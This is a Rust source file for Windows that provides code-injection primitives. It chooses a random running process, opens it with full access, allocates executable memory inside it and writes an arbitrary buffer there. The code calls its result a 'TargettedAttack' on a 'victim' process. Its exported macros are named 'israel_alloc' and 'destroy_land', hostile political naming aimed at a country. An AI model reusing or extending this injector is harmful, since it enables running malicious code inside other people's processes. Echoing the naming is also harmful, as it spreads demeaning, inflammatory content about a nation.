use crate::proc::{self, ProcessSnapshot};
use core::{alloc, ffi::c_void};
use std::{
    os::windows::{io::InvalidHandleError, raw},
    ptr::{self, null_mut},
};

use windows::Win32::Foundation::HANDLE;
use windows::Win32::System::{
    Diagnostics::Debug::WriteProcessMemory,
    Memory::{
        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS,
        VIRTUAL_ALLOCATION_TYPE, VirtualAllocEx,
    },
    Threading::{OpenProcess, PROCESS_ALL_ACCESS},
};

#[derive(Debug)]
pub struct TargettedAttack {
    pub victim_process_id: u32,
    pub block_ptr: *mut c_void,
}

#[derive(Debug)]
pub struct ProcessAbstraction {
    process_handle: HANDLE,
    process_id: u32,
}

pub struct AllocationWrapper {
    block_ptr: *mut c_void,
    hi: i8,
    lo: i8,
}

#[macro_export]
macro_rules! israel_alloc {
    ($p:expr) => {
        AllocationWrapper::new().israel_alloc($p)
    };
}

#[macro_export]
macro_rules! destroy_land {
    ($p:expr, $buf:expr, $size:expr) => {
        AllocationWrapper::new().israel_commit(&$p, $buf, $size)
    };
}

impl ProcessAbstraction {
    pub fn new(id: u32, handle: HANDLE) -> Self {
        Self {
            process_handle: handle,
            process_id: id,
        }
    }
}

impl AllocationWrapper {
    pub fn new() -> Self {
        Self {
            block_ptr: null_mut(),
            hi: 0,
            lo: 0,
        }
    }

    fn resolve_process_handle(&self, id: u32) -> Option<HANDLE> {
        unsafe { OpenProcess(PROCESS_ALL_ACCESS, false, id).ok() }
    }

    pub fn israel_alloc(&mut self, size: usize) -> Option<TargettedAttack> {
        let mut rproc = ProcessSnapshot::new();
        let p_id = rproc.find_random_process_id();
        let raw_handle_ptr = self.resolve_process_handle(p_id)?;

        let ptr: *mut c_void = unsafe {
            VirtualAllocEx(
                raw_handle_ptr,
                None,
                size,
                VIRTUAL_ALLOCATION_TYPE(MEM_COMMIT.0 | MEM_RESERVE.0),
                PAGE_PROTECTION_FLAGS(PAGE_EXECUTE_READWRITE.0),
            )
        };

        Some(TargettedAttack {
            victim_process_id: p_id,
            block_ptr: ptr,
        })
    }

    pub fn israel_commit(
        &mut self,
        atk: &TargettedAttack,
        buff: *const c_void,
        size: usize,
    ) -> Option<TargettedAttack> {
        let block_start = atk.block_ptr;
        let p_id = atk.victim_process_id;
        let raw_handle_ptr = self.resolve_process_handle(p_id)?;

        unsafe {
            let _ = WriteProcessMemory(raw_handle_ptr, block_start, buff, size, None);
        }

        Some(TargettedAttack {
            victim_process_id: p_id,
            block_ptr: block_start,
        })
    }
}
